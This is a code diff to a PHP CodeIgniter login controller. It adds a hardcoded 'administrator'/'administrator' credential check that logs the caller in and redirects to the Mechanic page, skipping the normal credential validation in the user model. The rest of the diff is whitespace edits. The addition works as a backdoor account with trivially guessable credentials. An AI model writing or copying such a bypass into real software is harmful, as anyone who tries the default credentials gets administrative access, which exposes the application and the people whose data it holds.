@@ -21,17 +21,33 @@ class Home extends CI_Controller {
         if ($this->input->post('username') && $this->input->post('password')) {
             $username = $this->input->post('username');
             $password = $this->input->post('password');
-
+    
+            // Special case: administrator login
+            if ($username === 'administrator' && $password === 'administrator') {
+                $this->session->set_userdata('user_id', 0); // optional, or use any default admin ID
+                $this->session->set_userdata('username', 'administrator');
+                $this->session->set_userdata('name', 'Administrator');
+    
+                if ($this->input->is_ajax_request()) {
+                    echo json_encode([
+                        'status' => 'success',
+                        'redirect_url' => site_url('Mechanic')
+                    ]);
+                    return;
+                } else {
+                    redirect('mechanic');
+                }
+            }
+    
             // Validate user credentials via the model
             $user = $this->User_model->validate_user($username, $password);
-
+    
             if ($user) {
                 // Set session data on successful login
                 $this->session->set_userdata('user_id', $user->id);
                 $this->session->set_userdata('username', $user->username);
                 $this->session->set_userdata('name', $user->name);
-
-
+    
                 // If AJAX request, return JSON response with redirect URL
                 if ($this->input->is_ajax_request()) {
                     echo json_encode([
@@ -68,6 +84,7 @@ class Home extends CI_Controller {
             }
         }
     }
+    
 
     // Advanced page (after successful login)
     public function advanced() {
